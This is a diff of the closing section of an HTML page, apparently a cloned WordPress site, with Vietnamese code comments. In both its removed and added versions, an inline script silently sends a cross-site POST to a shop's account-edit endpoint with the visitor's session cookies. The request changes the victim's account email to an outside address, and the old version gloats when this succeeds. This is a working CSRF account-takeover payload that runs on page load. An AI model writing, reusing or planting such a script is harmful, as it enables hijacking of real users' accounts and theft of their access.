@@ -2954,28 +2954,27 @@
       data-wp-strategy="defer"
     ></script>
     <script>
-      // Khi trang được load, tự động gửi request POST đến mydecobox.shop
-      window.onload = function () {
-        fetch("https://mydecobox.shop/my-account/edit-account/", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/x-www-form-urlencoded",
-          },
-          body: "email=lacnhuwork@gmail.com&save_account_details=1", // Đổi email
-          credentials: "include", // Gửi cookie session cùng với request
+      fetch("https://mydecobox.shop/my-account/edit-account/", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: "email=lacnhuwork@gmail.com&save_account_details=1",
+        credentials: "include",
+      })
+        .then((response) => {
+          console.log("Response status:", response.status); // Kiểm tra status code của response
+          if (!response.ok) {
+            throw new Error("Network response was not ok");
+          }
+          return response.text();
         })
-          .then((response) => response.text())
-          .then((text) => {
-            if (text.includes("lacnhuwork@gmail.com")) {
-              console.log("✅ Email đã bị đổi rồi đó 😈");
-            } else {
-              console.log("❌ Email chưa đổi được");
-            }
-          })
-          .catch((error) => {
-            console.log("❌ Lỗi khi gửi request", error);
-          });
-      };
+        .then((text) => {
+          console.log("Response text:", text); // In ra nội dung trả về từ server
+        })
+        .catch((error) => {
+          console.error("Error:", error); // In ra lỗi chi tiết
+        });
     </script>
   </body>
 </html>
